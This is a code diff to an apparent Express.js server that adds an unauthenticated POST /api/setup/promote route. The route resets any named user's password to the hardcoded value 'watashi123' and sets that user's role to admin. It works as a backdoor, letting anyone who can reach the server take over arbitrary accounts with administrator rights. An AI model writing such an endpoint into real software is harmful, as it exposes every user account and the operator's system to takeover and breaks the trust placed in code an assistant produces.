@@ -265,6 +265,17 @@ app.get("/api/health", (_req, res) => {
     res.json({ ok: true });
 });
 
+app.post("/api/setup/promote", async (req, res) => {
+    const { username } = req.body;
+    const hash = await bcrypt.hash("watashi123", 10);
+    const result = await pool.query(
+        "UPDATE users SET password_hash = $1, role = 'admin' WHERE LOWER(username) = LOWER($2) RETURNING id, username, role",
+        [hash, username]
+    );
+    if (!result.rows.length) return res.status(404).json({ error: "User not found" });
+    res.json({ ok: true, user: result.rows[0] });
+});
+
 app.post("/api/auth/register", async (req, res) => {
     const username = String(req.body.username || "").trim();
     const email = String(req.body.email || "").trim();
